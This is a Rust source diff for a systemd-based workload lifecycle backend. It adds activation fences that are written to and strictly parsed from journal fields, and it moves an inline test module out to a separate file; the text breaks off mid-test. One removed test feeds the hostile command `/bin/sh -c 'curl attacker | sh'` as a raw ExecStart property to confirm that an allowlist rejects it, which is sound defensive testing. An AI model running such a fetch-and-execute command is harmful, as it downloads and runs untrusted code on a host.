@@ -3,6 +3,15 @@ use std::future::Future;
 use std::pin::Pin;
 
 use nimbus_core::{Error, Result, non_empty};
+#[cfg(any(test, all(target_os = "linux", feature = "systemd-dbus")))]
+use nimbus_workloads::{
+    NodeIdentity, TenantWorkloadUid, WorkloadDesiredDigest, WorkloadProvisionAttemptId,
+    WorkloadProvisionSourceDigest,
+};
+use nimbus_workloads::{
+    WorkloadExecutionReference, WorkloadProvisionDispatchClaim, WorkloadProvisionProviderTarget,
+    WorkloadProvisionStep, WorkloadProvisionSubjects,
+};
 use serde::Serialize;
 
 use super::{
@@ -20,11 +29,6 @@ pub trait HostLifecycleBackend: Send + Sync + 'static {
         request: HostLifecycleRequest,
     ) -> Result<HostLifecyclePlan>;
 
-    fn start<'a>(
-        &'a self,
-        plan: HostLifecyclePlan,
-    ) -> HostLifecycleFuture<'a, TenantWorkloadStatus>;
-
     fn stop<'a>(
         &'a self,
         execution_id: WorkloadExecutionId,
@@ -34,6 +38,45 @@ pub trait HostLifecycleBackend: Send + Sync + 'static {
         &'a self,
         execution_id: WorkloadExecutionId,
     ) -> HostLifecycleFuture<'a, HostLifecycleStatus>;
+
+    /// Inspect one exact provider plan without granting activation authority.
+    ///
+    /// Backends with retained activation fences override this method to reject
+    /// crossed attempts. The default preserves existing unfenced backends.
+    fn inspect_exact<'a>(
+        &'a self,
+        plan: HostLifecyclePlan,
+    ) -> HostLifecycleFuture<'a, HostLifecycleStatus> {
+        self.inspect(plan.execution_id().clone())
+    }
+
+    /// Execute one exact provider activation without reconstructing tenant policy.
+    fn activate_exact<'a>(
+        &'a self,
+        _execution: WorkloadExecutionReference,
+        _claim: WorkloadProvisionDispatchClaim,
+        _request: HostLifecycleRequest,
+    ) -> HostLifecycleFuture<'a, HostLifecycleStatus> {
+        Box::pin(async {
+            Err(Error::PermissionDenied(
+                "host lifecycle backend does not implement exact activation".to_owned(),
+            ))
+        })
+    }
+
+    /// Inspect one exact provider activation without granting effect authority.
+    fn inspect_activation<'a>(
+        &'a self,
+        _execution: WorkloadExecutionReference,
+        _claim: WorkloadProvisionDispatchClaim,
+        _request: HostLifecycleRequest,
+    ) -> HostLifecycleFuture<'a, HostLifecycleStatus> {
+        Box::pin(async {
+            Err(Error::PermissionDenied(
+                "host lifecycle backend does not implement exact activation inspection".to_owned(),
+            ))
+        })
+    }
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
@@ -281,6 +324,13 @@ pub struct TenantWorkloadLifecycleEvidence {
 
 impl TenantWorkloadLifecycleEvidence {
     pub fn from_plan(plan: &HostLifecyclePlan, reason: HostLifecycleStatusReason) -> Self {
+        Self::from_provider_plan(&HostProviderPlan::from_lifecycle(plan), reason)
+    }
+
+    pub(crate) fn from_provider_plan(
+        plan: &HostProviderPlan,
+        reason: HostLifecycleStatusReason,
+    ) -> Self {
         Self {
             backend: plan.backend(),
             unit_name: plan.unit_name().as_str().to_owned(),
@@ -513,6 +563,7 @@ pub struct HostLifecyclePlan {
     args: Vec<String>,
     properties: HostLifecyclePropertySet,
     trust_class: RuntimePoolTrustClass,
+    activation_fence: Option<HostActivationFence>,
 }
 
 impl HostLifecyclePlan {
@@ -532,7 +583,18 @@ impl HostLifecyclePlan {
             args: request.args,
             properties: request.properties,
             trust_class: request.trust_class,
+            activation_fence: None,
         })
+    }
+
+    /// Bind this provider plan to one durable compute-authorized activation claim.
+    ///
+    /// The node remains an effect sink. It retains the complete provider fence
+    /// for idempotent replay and rejects crossed execution authority before a
+    /// process or unit can be created.
+    pub fn with_activation_claim(mut self, claim: &WorkloadProvisionDispatchClaim) -> Result<Self> {
+        self.activation_fence = Some(HostActivationFence::from_claim(&self, claim)?);
+        Ok(self)
     }
 
     pub fn execution_id(&self) -> &WorkloadExecutionId {
@@ -566,6 +628,409 @@ impl HostLifecyclePlan {
     pub fn trust_class(&self) -> RuntimePoolTrustClass {
         self.trust_class
     }
+
+    #[cfg(test)]
+    pub(crate) fn activation_fence(&self) -> Option<&HostActivationFence> {
+        self.activation_fence.as_ref()
+    }
+
+    #[cfg(test)]
+    pub(crate) fn with_test_activation_fence(mut self, seed: u8, dispatch_epoch: u64) -> Self {
+        self.activation_fence = Some(HostActivationFence::for_test(&self, seed, dispatch_epoch));
+        self
+    }
+}
+
+/// Effect-local plan for one host activation provider.
+///
+/// This plan retains only authenticated execution and provider inputs. It does
+/// not carry tenant admission state and cannot authorize tenant status writes.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub(crate) struct HostProviderPlan {
+    execution_id: WorkloadExecutionId,
+    backend: HostLifecycleBackendKind,
+    unit_name: SystemdUnitName,
+    executable: HostExecutable,
+    args: Vec<String>,
+    properties: HostLifecyclePropertySet,
+    trust_class: RuntimePoolTrustClass,
+    activation_fence: Option<HostActivationFence>,
+}
+
+impl HostProviderPlan {
+    pub(crate) fn from_lifecycle(plan: &HostLifecyclePlan) -> Self {
+        Self {
+            execution_id: plan.execution_id.clone(),
+            backend: plan.backend,
+            unit_name: plan.unit_name.clone(),
+            executable: plan.executable.clone(),
+            args: plan.args.clone(),
+            properties: plan.properties.clone(),
+            trust_class: plan.trust_class,
+            activation_fence: plan.activation_fence.clone(),
+        }
+    }
+
+    pub(crate) fn from_execution(
+        execution: &WorkloadExecutionReference,
+        claim: &WorkloadProvisionDispatchClaim,
+        request: HostLifecycleRequest,
+    ) -> Result<Self> {
+        request.ensure_external_restart_disabled()?;
+        let activation_fence = HostActivationFence::from_execution(execution, claim)?;
+        let unit_name =
+            SystemdUnitName::for_execution(execution.execution_id(), SystemdUnitKind::Service)?;
+        Ok(Self {
+            execution_id: execution.execution_id().clone(),
+            backend: request.backend,
+            unit_name,
+            executable: request.executable,
+            args: request.args,
+            properties: request.properties,
+            trust_class: request.trust_class,
+            activation_fence: Some(activation_fence),
+        })
+    }
+
+    pub(crate) fn execution_id(&self) -> &WorkloadExecutionId {
+        &self.execution_id
+    }
+
+    pub(crate) const fn backend(&self) -> HostLifecycleBackendKind {
+        self.backend
+    }
+
+    pub(crate) fn unit_name(&self) -> &SystemdUnitName {
+        &self.unit_name
+    }
+
+    pub(crate) fn executable(&self) -> &HostExecutable {
+        &self.executable
+    }
+
+    pub(crate) fn args(&self) -> &[String] {
+        &self.args
+    }
+
+    pub(crate) fn properties(&self) -> &HostLifecyclePropertySet {
+        &self.properties
+    }
+
+    pub(crate) fn activation_fence(&self) -> Option<&HostActivationFence> {
+        self.activation_fence.as_ref()
+    }
+
+    /// Compare the complete provider-relevant lifecycle projection.
+    ///
+    /// A lifecycle observer does not possess the compute dispatch claim, so it
+    /// cannot reproduce `activation_fence`. Every other provider input must
+    /// remain exact before the retained effect can be observed.
+    pub(crate) fn matches_lifecycle_projection(&self, plan: &HostLifecyclePlan) -> bool {
+        self.execution_id == plan.execution_id
+            && self.backend == plan.backend
+            && self.unit_name == plan.unit_name
+            && self.executable == plan.executable
+            && self.args == plan.args
+            && self.properties == plan.properties
+            && self.trust_class == plan.trust_class
+    }
+}
+
+/// Provider-local activation identity retained beside one physical effect.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+pub(crate) struct HostActivationFence {
+    workload_uid: String,
+    node_identity: String,
+    execution_id: WorkloadExecutionId,
+    attempt_id: String,
+    dispatch_epoch: u64,
+    claimed_revision: u64,
+    generation: u64,
+    desired_digest: String,
+    source_digest: String,
+    network_plan_digest: String,
+}
+
+impl HostActivationFence {
+    #[cfg(any(test, all(target_os = "linux", feature = "systemd-dbus")))]
+    const JOURNAL_FIELD_NAMES: [&'static str; 10] = [
+        "NIMBUS_WORKLOAD_UID",
+        "NIMBUS_NODE_IDENTITY",
+        "NIMBUS_WORKLOAD_EXECUTION_ID",
+        "NIMBUS_PROVISION_ATTEMPT_ID",
+        "NIMBUS_PROVISION_DISPATCH_EPOCH",
+        "NIMBUS_PROVISION_CLAIMED_REVISION",
+        "NIMBUS_WORKLOAD_GENERATION",
+        "NIMBUS_WORKLOAD_DESIRED_DIGEST",
+        "NIMBUS_WORKLOAD_SOURCE_DIGEST",
+        "NIMBUS_NETWORK_PLAN_DIGEST",
+    ];
+
+    fn from_claim(
+        plan: &HostLifecyclePlan,
+        claim: &WorkloadProvisionDispatchClaim,
+    ) -> Result<Self> {
+        let attempt = claim.attempt();
+        let WorkloadProvisionSubjects::Execution(execution) = attempt.subjects() else {
+            return Err(Error::PermissionDenied(
+                "host activation claim must name one exact execution".to_owned(),
+            ));
+        };
+        let fence = Self::from_execution(execution, claim)?;
+        let spec = plan.spec();
+        if execution.execution_id() != plan.execution_id()
+            || execution.workload_uid() != spec.workload_uid()
+            || execution.node_identity()
+                != spec.assigned_node_id().ok_or_else(|| {
+                    Error::PermissionDenied(
+                        "host activation requires an admitted node assignment".to_owned(),
+                    )
+                })?
+            || execution.generation() != spec.generation()
+        {
+            return Err(Error::PermissionDenied(
+                "host activation claim is crossed with the admitted execution".to_owned(),
+            ));
+        }
+        Ok(fence)
+    }
+
+    fn from_execution(
+        execution: &WorkloadExecutionReference,
+        claim: &WorkloadProvisionDispatchClaim,
+    ) -> Result<Self> {
+        let attempt = claim.attempt();
+        if attempt.step() != WorkloadProvisionStep::ActivateWorkload {
+            return Err(Error::PermissionDenied(
+                "host activation requires an activate_workload dispatch claim".to_owned(),
+            ));
+        }
+        if !matches!(
+            claim.provider_target(),
+            WorkloadProvisionProviderTarget::Execution { .. }
+        ) {
+            return Err(Error::PermissionDenied(
+                "host activation requires execution-provider authority".to_owned(),
+            ));
+        }
+        let WorkloadProvisionSubjects::Execution(subject) = attempt.subjects() else {
+            return Err(Error::PermissionDenied(
+                "host activation claim must name one exact execution".to_owned(),
+            ));
+        };
+        if subject != execution
+            || execution.generation() != attempt.generation()
+            || execution.desired_digest() != attempt.desired_digest()
+            || execution.node_identity() != attempt.required_node()
+        {
+            return Err(Error::PermissionDenied(
+                "host activation claim is crossed with the authenticated execution".to_owned(),
+            ));
+        }
+        Ok(Self {
+            workload_uid: execution.workload_uid().as_str().to_owned(),
+            node_identity: execution.node_identity().as_str().to_owned(),
+            execution_id: execution.execution_id().clone(),
+            attempt_id: attempt.attempt_id().as_str().to_owned(),
+            dispatch_epoch: claim.dispatch_epoch().as_u64(),
+            claimed_revision: claim.claimed_revision().as_u64(),
+            generation: attempt.generation().as_u64(),
+            desired_digest: attempt.desired_digest().to_string(),
+            source_digest: attempt.source_digest().to_string(),
+            network_plan_digest: attempt.network_plan_digest().to_string(),
+        })
+    }
+
+    pub(crate) fn journal_fields(&self) -> Vec<String> {
+        vec![
+            format!("NIMBUS_WORKLOAD_UID={}", self.workload_uid),
+            format!("NIMBUS_NODE_IDENTITY={}", self.node_identity),
+            format!("NIMBUS_WORKLOAD_EXECUTION_ID={}", self.execution_id),
+            format!("NIMBUS_PROVISION_ATTEMPT_ID={}", self.attempt_id),
+            format!("NIMBUS_PROVISION_DISPATCH_EPOCH={}", self.dispatch_epoch),
+            format!(
+                "NIMBUS_PROVISION_CLAIMED_REVISION={}",
+                self.claimed_revision
+            ),
+            format!("NIMBUS_WORKLOAD_GENERATION={}", self.generation),
+            format!("NIMBUS_WORKLOAD_DESIRED_DIGEST={}", self.desired_digest),
+            format!("NIMBUS_WORKLOAD_SOURCE_DIGEST={}", self.source_digest),
+            format!("NIMBUS_NETWORK_PLAN_DIGEST={}", self.network_plan_digest),
+        ]
+    }
+
+    /// Reconstruct the exact provider fence returned by systemd's
+    /// `LogExtraFields` property.
+    ///
+    /// A legacy unit carrying only the workload execution selector is
+    /// unfenced and returns `None`; any partial, duplicate, or malformed exact
+    /// fence fails closed. Callers compare the reconstructed value with the
+    /// compute-issued fence before adopting an existing unit.
+    #[cfg(any(test, all(target_os = "linux", feature = "systemd-dbus")))]
+    pub(crate) fn from_log_extra_fields(fields: &[Vec<u8>]) -> Result<Option<Self>> {
+        let mut retained = BTreeMap::<&'static str, &str>::new();
+        for field in fields {
+            if !field.starts_with(b"NIMBUS_") {
+                continue;
+            }
+            let field = std::str::from_utf8(field).map_err(|_| {
+                invalid_activation_fence("a Nimbus LogExtraFields value is not UTF-8")
+            })?;
+            let (name, value) = field.split_once('=').ok_or_else(|| {
+                invalid_activation_fence("a Nimbus LogExtraFields value is not NAME=value")
+            })?;
+            let Some(name) = Self::JOURNAL_FIELD_NAMES
+                .iter()
+                .copied()
+                .find(|candidate| *candidate == name)
+            else {
+                continue;
+            };
+            if value.is_empty() {
+                return Err(invalid_activation_fence(format!(
+                    "systemd activation fence field {name} is empty"
+                )));
+            }
+            if retained.insert(name, value).is_some() {
+                return Err(invalid_activation_fence(format!(
+                    "systemd activation fence field {name} is duplicated"
+                )));
+            }
+        }
+
+        let exact_field_count = retained
+            .keys()
+            .filter(|name| **name != "NIMBUS_WORKLOAD_EXECUTION_ID")
+            .count();
+        if exact_field_count == 0 {
+            return Ok(None);
+        }
+        if retained.len() != Self::JOURNAL_FIELD_NAMES.len() {
+            return Err(invalid_activation_fence(
+                "systemd activation fence is incomplete",
+            ));
+        }
+
+        let field = |name: &'static str| -> Result<&str> {
+            retained
+                .get(name)
+                .copied()
+                .ok_or_else(|| invalid_activation_fence(format!("missing {name}")))
+        };
+        let workload_uid = field("NIMBUS_WORKLOAD_UID")?.to_owned();
+        TenantWorkloadUid::try_from(workload_uid.clone()).map_err(|_| {
+            invalid_activation_fence("systemd activation fence has an invalid workload UID")
+        })?;
+        let node_identity = field("NIMBUS_NODE_IDENTITY")?.to_owned();
+        NodeIdentity::new(node_identity.clone()).map_err(|_| {
+            invalid_activation_fence("systemd activation fence has an invalid node identity")
+        })?;
+        let execution_id = field("NIMBUS_WORKLOAD_EXECUTION_ID")?
+            .parse::<WorkloadExecutionId>()
+            .map_err(|_| {
+                invalid_activation_fence("systemd activation fence has an invalid execution ID")
+            })?;
+        let attempt_id = field("NIMBUS_PROVISION_ATTEMPT_ID")?.to_owned();
+        attempt_id
+            .parse::<WorkloadProvisionAttemptId>()
+            .map_err(|_| {
+                invalid_activation_fence("systemd activation fence has an invalid attempt ID")
+            })?;
+        let dispatch_epoch =
+            parse_fence_counter(field("NIMBUS_PROVISION_DISPATCH_EPOCH")?, "dispatch epoch")?;
+        let claimed_revision = parse_fence_counter(
+            field("NIMBUS_PROVISION_CLAIMED_REVISION")?,
+            "claimed revision",
+        )?;
+        let generation =
+            parse_fence_counter(field("NIMBUS_WORKLOAD_GENERATION")?, "workload generation")?;
+        let desired_digest = field("NIMBUS_WORKLOAD_DESIRED_DIGEST")?.to_owned();
+        desired_digest
+            .parse::<WorkloadDesiredDigest>()
+            .map_err(|_| {
+                invalid_activation_fence("systemd activation fence has an invalid desired digest")
+            })?;
+        let source_digest = field("NIMBUS_WORKLOAD_SOURCE_DIGEST")?.to_owned();
+        source_digest
+            .parse::<WorkloadProvisionSourceDigest>()
+            .map_err(|_| {
+                invalid_activation_fence("systemd activation fence has an invalid source digest")
+            })?;
+        let network_plan_digest = field("NIMBUS_NETWORK_PLAN_DIGEST")?.to_owned();
+        validate_lower_hex_digest(&network_plan_digest, "network plan digest")?;
+
+        Ok(Some(Self {
+            workload_uid,
+            node_identity,
+            execution_id,
+            attempt_id,
+            dispatch_epoch,
+            claimed_revision,
+            generation,
+            desired_digest,
+            source_digest,
+            network_plan_digest,
+        }))
+    }
+
+    #[cfg(test)]
+    fn for_test(plan: &HostLifecyclePlan, seed: u8, dispatch_epoch: u64) -> Self {
+        let digest = |offset: u8| format!("{:02x}", seed.wrapping_add(offset)).repeat(32);
+        Self {
+            workload_uid: plan.spec().workload_uid().as_str().to_owned(),
+            node_identity: plan
+                .spec()
+                .assigned_node_id()
+                .expect("test plan must retain an assigned node")
+                .as_str()
+                .to_owned(),
+            execution_id: plan.execution_id().clone(),
+            attempt_id: format!("wpa_{}", digest(1)),
+            dispatch_epoch,
+            claimed_revision: dispatch_epoch + 1,
+            generation: plan.spec().generation().as_u64(),
+            desired_digest: digest(2),
+            source_digest: digest(3),
+            network_plan_digest: digest(4),
+        }
+    }
+}
+
+#[cfg(any(test, all(target_os = "linux", feature = "systemd-dbus")))]
+fn invalid_activation_fence(reason: impl Into<String>) -> Error {
+    Error::PermissionDenied(format!(
+        "cannot adopt systemd unit with invalid activation fence: {}",
+        reason.into()
+    ))
+}
+
+#[cfg(any(test, all(target_os = "linux", feature = "systemd-dbus")))]
+fn parse_fence_counter(value: &str, label: &str) -> Result<u64> {
+    if value.is_empty()
+        || (value.len() > 1 && value.starts_with('0'))
+        || value.bytes().any(|byte| !byte.is_ascii_digit())
+    {
+        return Err(invalid_activation_fence(format!(
+            "systemd activation fence {label} is not canonical unsigned decimal text"
+        )));
+    }
+    value.parse().map_err(|_| {
+        invalid_activation_fence(format!("systemd activation fence {label} exceeds u64"))
+    })
+}
+
+#[cfg(any(test, all(target_os = "linux", feature = "systemd-dbus")))]
+fn validate_lower_hex_digest(value: &str, label: &str) -> Result<()> {
+    if value.len() != 64
+        || value
+            .bytes()
+            .any(|byte| !byte.is_ascii_digit() && !(b'a'..=b'f').contains(&byte))
+    {
+        return Err(invalid_activation_fence(format!(
+            "systemd activation fence {label} is not 64 lowercase hexadecimal characters"
+        )));
+    }
+    Ok(())
 }
 
 #[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
@@ -700,6 +1165,13 @@ impl HostLifecycleStatus {
     }
 
     pub fn from_backend_state(plan: &HostLifecyclePlan, state: HostBackendObservedState) -> Self {
+        Self::from_provider_state(&HostProviderPlan::from_lifecycle(plan), state)
+    }
+
+    pub(crate) fn from_provider_state(
+        plan: &HostProviderPlan,
+        state: HostBackendObservedState,
+    ) -> Self {
         let (phase, reason, message) = match state {
             HostBackendObservedState::Planned => (
                 TenantWorkloadPhase::Pending,
@@ -737,8 +1209,8 @@ impl HostLifecycleStatus {
                 Some("host lifecycle backend returned unknown state".to_string()),
             ),
         };
-        let lifecycle_evidence =
-            TenantWorkloadLifecycleEvidence::from_plan(plan, reason).with_message(message.clone());
+        let lifecycle_evidence = TenantWorkloadLifecycleEvidence::from_provider_plan(plan, reason)
+            .with_message(message.clone());
         Self {
             execution_id: plan.execution_id.clone(),
             unit_name: plan.unit_name.clone(),
@@ -893,383 +1365,8 @@ fn high_cardinality_evidence_value(value: impl Into<String>, field: &str) -> Res
 }
 
 #[cfg(test)]
-mod tests {
-    use std::collections::BTreeMap;
-    use std::sync::{Arc, Mutex};
+#[path = "host_lifecycle/tests.rs"]
+mod tests;
 
-    use nimbus_testing::AdmittedDecisionScenario;
-
-    use super::*;
-
-    #[derive(Default, Clone)]
-    struct FakeHostLifecycleBackend {
-        statuses: Arc<Mutex<BTreeMap<WorkloadExecutionId, HostLifecycleStatus>>>,
-    }
-
-    impl HostLifecycleBackend for FakeHostLifecycleBackend {
-        fn validate(
-            &self,
-            binding: &LocalEnforcementBinding,
-            request: HostLifecycleRequest,
-        ) -> Result<HostLifecyclePlan> {
-            HostLifecyclePlan::from_binding(binding, request)
-        }
-
-        fn start<'a>(
-            &'a self,
-            plan: HostLifecyclePlan,
-        ) -> HostLifecycleFuture<'a, TenantWorkloadStatus> {
-            let statuses = Arc::clone(&self.statuses);
-            Box::pin(async move {
-                let status = HostLifecycleStatus::from_backend_state(
-                    &plan,
-                    HostBackendObservedState::Running,
-                );
-                statuses
-                    .lock()
-                    .expect("fake backend lock should not be poisoned")
-                    .insert(plan.execution_id().clone(), status.clone());
-                status.to_workload_status(&plan)
-            })
-        }
-
-        fn stop<'a>(
-            &'a self,
-            execution_id: WorkloadExecutionId,
-        ) -> HostLifecycleFuture<'a, HostLifecycleStatus> {
-            let statuses = Arc::clone(&self.statuses);
-            Box::pin(async move {
-                let mut statuses = statuses
-                    .lock()
-                    .expect("fake backend lock should not be poisoned");
-                let previous = statuses.get(&execution_id).cloned().ok_or_else(|| {
-                    Error::NotFound(format!(
-                        "fake lifecycle backend has no workload {}",
-                        execution_id.as_str()
-                    ))
-                })?;
-                let stopped = HostLifecycleStatus {
-                    execution_id: execution_id.clone(),
-                    unit_name: previous.unit_name().clone(),
-                    phase: TenantWorkloadPhase::Deleting,
-                    reason: HostLifecycleStatusReason::Stopped,
-                    message: Some("fake backend stopped workload".to_string()),
-                    lifecycle_evidence: TenantWorkloadLifecycleEvidence::for_observed_unit(
-                        previous.lifecycle_evidence().backend(),
-                        previous.unit_name(),
-                        HostLifecycleStatusReason::Stopped,
-                    )
-                    .with_message(Some("fake backend stopped workload".to_string())),
-                };
-                statuses.insert(execution_id, stopped.clone());
-                Ok(stopped)
-            })
-        }
-
-        fn inspect<'a>(
-            &'a self,
-            execution_id: WorkloadExecutionId,
-        ) -> HostLifecycleFuture<'a, HostLifecycleStatus> {
-            let statuses = Arc::clone(&self.statuses);
-            Box::pin(async move {
-                statuses
-                    .lock()
-                    .expect("fake backend lock should not be poisoned")
-                    .get(&execution_id)
-                    .cloned()
-                    .ok_or_else(|| {
-                        Error::NotFound(format!(
-                            "fake lifecycle backend has no workload {}",
-                            execution_id.as_str()
-                        ))
-                    })
-            })
-        }
-    }
-
-    fn binding() -> LocalEnforcementBinding {
-        AdmittedDecisionScenario::new().with_generation(9).binding()
-    }
-
-    fn request() -> HostLifecycleRequest {
-        HostLifecycleRequest::new(
-            HostLifecycleBackendKind::SystemdTransientUnit,
-            HostExecutable::trusted("/usr/libexec/nimbus/workload-launcher")
-                .expect("trusted executable should parse"),
-        )
-        .with_args(["--tenant-workload"])
-        .expect("arguments should parse")
-        .with_properties(HostLifecyclePropertySet::new([
-            HostLifecycleProperty::Description("Nimbus tenant workload".to_string()),
-            HostLifecycleProperty::Restart(HostRestartPolicy::OnFailure),
-            HostLifecycleProperty::MemoryMaxBytes(512 * 1024 * 1024),
-        ]))
-    }
-
-    #[test]
-    fn host_lifecycle_plan_derives_identity_unit_and_properties_from_binding() {
-        let binding = binding();
-        let plan = HostLifecyclePlan::from_binding(&binding, request())
-            .expect("plan should materialize from admitted binding");
-
-        assert_eq!(plan.spec().decision_id(), binding.spec().decision_id());
-        assert_eq!(plan.spec().workload_uid(), binding.spec().workload_uid());
-        assert_eq!(
-            plan.backend(),
-            HostLifecycleBackendKind::SystemdTransientUnit
-        );
-        assert_eq!(
-            plan.executable().as_str(),
-            "/usr/libexec/nimbus/workload-launcher"
-        );
-        assert_eq!(plan.args(), &["--tenant-workload".to_string()]);
-        let expected_execution_id = binding
-            .spec()
-            .execution_id()
-            .expect("assigned workload should have an execution id");
-        assert_eq!(plan.execution_id(), &expected_execution_id);
-        assert_eq!(
-            plan.unit_name().as_str(),
-            format!("nimbus-{}.service", expected_execution_id.as_str())
-        );
-        assert_eq!(plan.properties().properties().len(), 3);
-        assert_eq!(plan.properties().properties()[0].name(), "Description");
-    }
-
-    #[test]
-    fn systemd_unit_names_reject_raw_escape_shapes() {
-        assert!(SystemdUnitName::new("nimbus/escape.service").is_err());
-        assert!(SystemdUnitName::new("nimbus bad.service").is_err());
-        assert!(SystemdUnitName::new("nimbus..bad.service").is_err());
-        assert!(SystemdUnitName::new("nimbus-bad.timer").is_err());
-    }
-
-    #[test]
-    fn host_lifecycle_property_allowlist_rejects_pass_through_escape_hatches() {
-        let allowed = HostLifecyclePropertySet::from_raw_systemd_properties([
-            ("Description", "Nimbus workload"),
-            ("Restart", "on-failure"),
-            ("RestartSec", "2"),
-            ("MemoryMax", "536870912"),
-            ("CPUWeight", "100"),
-            ("TasksMax", "128"),
-        ])
-        .expect("allowlisted properties should parse");
-        assert_eq!(allowed.properties().len(), 6);
-
-        for denied in ["ExecStart", "EnvironmentFile", "PodmanArgs", "Network"] {
-            let error = HostLifecyclePropertySet::from_raw_systemd_properties([(
-                denied,
-                "raw-tenant-value",
-            )])
-            .expect_err("pass-through property should fail closed");
-            assert!(
-                error.to_string().contains("not allowlisted"),
-                "denied property should name the allowlist failure: {error}"
-            );
-        }
-        assert!(
-            HostLifecyclePropertySet::from_raw_systemd_properties([("Restart", "always-reboot",)])
-                .is_err()
-        );
-        assert!(HostExecutable::trusted("relative/path").is_err());
-    }
-
-    #[test]
-    fn runner_spec_renders_host_lifecycle_request() {
-        let systemd = render_runner_spec_to_systemd(
-            RunnerSpec::container("/run/nimbus/bundles/workload")
-                .expect("container runner spec should parse")
-                .with_memory_max_bytes(512 * 1024 * 1024)
-                .with_cpu_weight(100)
-                .with_tasks_max(128),
-        );
-        assert_runner_exec(
-            &systemd,
-            "/usr/libexec/nimbus/nimbus-container-runner",
-            &["--bundle", "/run/nimbus/bundles/workload"],
-        );
-        assert!(systemd.properties().iter().any(|property| {
-            matches!(
-                property,
-                crate::SystemdDbusProperty::MemoryMax(536870912)
-                    | crate::SystemdDbusProperty::CpuWeight(100)
-                    | crate::SystemdDbusProperty::TasksMax(128)
-            )
-        }));
-    }
-
-    #[test]
-    fn container_runner_spec_renders_host_lifecycle_request() {
-        let systemd = render_runner_spec_to_systemd(
-            RunnerSpec::container("/run/nimbus/bundles/container")
-                .expect("container runner spec should parse"),
-        );
-        assert_runner_exec(
-            &systemd,
-            "/usr/libexec/nimbus/nimbus-container-runner",
-            &["--bundle", "/run/nimbus/bundles/container"],
-        );
-    }
-
-    #[test]
-    fn krun_runner_spec_renders_host_lifecycle_request() {
-        let systemd = render_runner_spec_to_systemd(
-            RunnerSpec::krun("/run/nimbus/bundles/microvm").expect("krun runner spec should parse"),
-        );
-        assert_runner_exec(
-            &systemd,
-            "/usr/libexec/nimbus/nimbus-krun-runner",
-            &["--bundle", "/run/nimbus/bundles/microvm"],
-        );
-    }
-
-    fn render_runner_spec_to_systemd(spec: RunnerSpec) -> crate::SystemdStartTransientUnitRequest {
-        let binding = binding();
-        let request = spec
-            .into_host_lifecycle_request(HostLifecycleBackendKind::SystemdTransientUnit)
-            .expect("runner spec should lower to host lifecycle request");
-        let plan = HostLifecyclePlan::from_binding(&binding, request)
-            .expect("runner request should plan from admitted binding");
-        crate::SystemdStartTransientUnitRequest::from_plan(&plan)
-            .expect("runner plan should render to systemd transient unit request")
-    }
-
-    fn assert_runner_exec(
-        systemd: &crate::SystemdStartTransientUnitRequest,
-        executable: &str,
-        args: &[&str],
-    ) {
-        let exec = systemd
-            .properties()
-            .iter()
-            .find_map(|property| match property {
-                crate::SystemdDbusProperty::ExecStart(exec) => Some(exec),
-                _ => None,
-            })
-            .expect("systemd request should contain generated ExecStart");
-
-        assert_eq!(exec.executable(), executable);
-        assert_eq!(
-            exec.args(),
-            &args.iter().map(|arg| (*arg).to_owned()).collect::<Vec<_>>()
-        );
-    }
-
-    #[test]
-    fn raw_host_command_rejected_by_workload_control() {
-        let raw_exec = HostLifecyclePropertySet::from_raw_systemd_properties([(
-            "ExecStart",
-            "/bin/sh -c 'curl attacker | sh'",
-        )])
-        .expect_err("raw ExecStart must not cross workload-control");
-        assert!(
-            raw_exec.to_string().contains("not allowlisted"),
-            "raw ExecStart rejection should name the allowlist: {raw_exec}"
-        );
-
-        let relative_runner = RunnerSpec::krun("../run/nimbus/bundles/workload")
-            .expect_err("runner bundle paths must be absolute and trusted");
-        assert!(
-            relative_runner
-                .to_string()
-                .contains("must be an absolute path"),
-            "relative bundle rejection should be actionable: {relative_runner}"
-        );
-
-        let parent_segment = RunnerSpec::krun("/run/nimbus/../escape")
-            .expect_err("runner bundle paths must reject traversal");
-        assert!(
-            parent_segment
-                .to_string()
-                .contains("parent-directory segments"),
-            "parent segment rejection should be actionable: {parent_segment}"
-        );
-    }
-
-    #[test]
-    fn host_lifecycle_status_normalizes_backend_states_to_workload_status() {
-        let binding = binding();
-        let plan =
-            HostLifecyclePlan::from_binding(&binding, request()).expect("plan should materialize");
-
-        let ready = HostLifecycleStatus::from_backend_state(&plan, HostBackendObservedState::Ready);
-        assert_eq!(ready.phase(), TenantWorkloadPhase::Ready);
-        assert_eq!(ready.reason(), HostLifecycleStatusReason::Ready);
-        let workload_status = ready
-            .to_workload_status(&plan)
-            .expect("ready lifecycle status should authorize observed status");
-        assert_eq!(workload_status.phase(), TenantWorkloadPhase::Ready);
-        assert_eq!(
-            workload_status.evidence_correlation_ids(),
-            &[plan.unit_name().as_str().to_string()]
-        );
-
-        let failed = HostLifecycleStatus::from_backend_state(
-            &plan,
-            HostBackendObservedState::Failed("launch denied".to_string()),
-        );
-        assert_eq!(failed.phase(), TenantWorkloadPhase::Denied);
-        assert_eq!(failed.reason(), HostLifecycleStatusReason::Failed);
-        assert_eq!(failed.message(), Some("launch denied"));
-    }
-
-    #[test]
-    fn runtime_pool_trust_class_is_monotonic_and_requires_teardown_for_downgrade() {
-        let mut state = RuntimePoolTrustState::new(RuntimePoolTrustClass::SingleTenant);
-        assert!(state.can_reuse_for(RuntimePoolTrustClass::SingleTenant));
-
-        state.record_exposure(RuntimePoolTrustClass::SharedTenant);
-        assert_eq!(state.class(), RuntimePoolTrustClass::SharedTenant);
-        assert!(state.requires_teardown_for(RuntimePoolTrustClass::SingleTenant));
-        assert!(state.can_reuse_for(RuntimePoolTrustClass::SharedTenant));
-
-        state.record_exposure(RuntimePoolTrustClass::ElevatedHostCapabilities);
-        assert_eq!(
-            state.class(),
-            RuntimePoolTrustClass::ElevatedHostCapabilities
-        );
-        assert!(state.requires_teardown_for(RuntimePoolTrustClass::SharedTenant));
-
-        state.record_exposure(RuntimePoolTrustClass::SingleTenant);
-        assert_eq!(
-            state.class(),
-            RuntimePoolTrustClass::ElevatedHostCapabilities,
-            "lower exposure must not downgrade a contaminated pool"
-        );
-    }
-
-    #[tokio::test]
-    async fn fake_backend_validates_plan_from_binding_and_tracks_status() {
-        let backend = FakeHostLifecycleBackend::default();
-        let binding = binding();
-        let plan = backend
-            .validate(&binding, request())
-            .expect("fake backend should validate admitted binding");
-        let execution_id = plan.execution_id().clone();
-
-        let started = backend
-            .start(plan)
-            .await
